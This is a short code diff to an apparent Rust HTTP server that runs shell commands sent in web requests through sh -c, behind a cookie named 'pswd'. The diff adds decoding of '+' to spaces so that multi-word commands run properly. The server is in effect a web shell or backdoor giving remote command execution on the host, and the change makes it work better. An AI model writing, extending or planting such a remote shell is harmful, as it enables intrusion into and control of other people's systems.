@@ -27,6 +27,12 @@ fn extract_cookie_value(req: &Request<Body>, key: &str) -> Option<String> {
     None
 }
 
+// Function to decode spaces and handle the command properly
+fn decode_command(command: &str) -> String {
+    // Replace '+' with spaces (standard URL encoding for space)
+    command.replace("+", " ")
+}
+
 async fn handle_request(req: Request<Body>) -> Result<Response<Body>, hyper::Error> {
     // extract psswd from cookies
     match extract_cookie_value(&req, "pswd") {
@@ -46,11 +52,13 @@ async fn handle_request(req: Request<Body>) -> Result<Response<Body>, hyper::Err
         return Ok(Response::new(Body::from("No command specified.")));
     }
 
-    println!("Executing command: {}", command);
+    // Decode the command to handle spaces properly
+    let decoded_command = decode_command(command);
+    println!("Executing command: {}", decoded_command);
 
     let output = Command::new("sh")
         .arg("-c")
-        .arg(command)
+        .arg(decoded_command)
         .output();
 
     match output {
